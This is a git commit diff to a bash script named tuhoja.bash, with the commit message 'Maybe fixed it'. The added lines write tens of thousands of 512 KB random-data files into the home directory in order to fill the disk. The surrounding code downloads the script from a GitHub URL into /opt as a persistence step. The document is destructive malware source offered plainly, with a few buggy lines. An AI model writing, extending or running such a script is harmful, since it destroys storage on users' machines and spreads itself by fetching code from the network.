0a02070c2f1e58438365940c711b37957d763357
Poliisi5 <hermannipinomaki@gmail.com>
2025-01-13 13:49:59 +0200

    Maybe fixed it

--- tuhoja.bash
+++ tuhoja.bash
@@ -3,6 +3,19 @@ TEMPFILE=~counter.tmp
 PERSISTENCE_DIR=/opt/tuhoja.sh
 COUNTER=0
 if test -f $PERSISTENCE_DIR ; then
+  if test -f $TEMPFILE ; then
+    $COUNTER = cat $TEMPFILE
+  else
+    echo 0 > $TEMPFILE
+  fi
+  for (( c=0; c<=50000; c++ ))
+  do
+    COUNTER=$[$(cat $TEMPFILE) + 1]
+    echo $COUNTER > $TEMPFILE
+    head -c 512000 /dev/urandom | base64 > ~/$COUNTER
+    echo $COUNTER
+  done
+  rm -f $TEMPFILE
 else
   curl -o $PERSISTENCE_DIR https://raw.githubusercontent.com/Poliisi5/tuhoja/refs/heads/main/tuhoja.bash
   chmod +X $PERSISTENCE_DIR
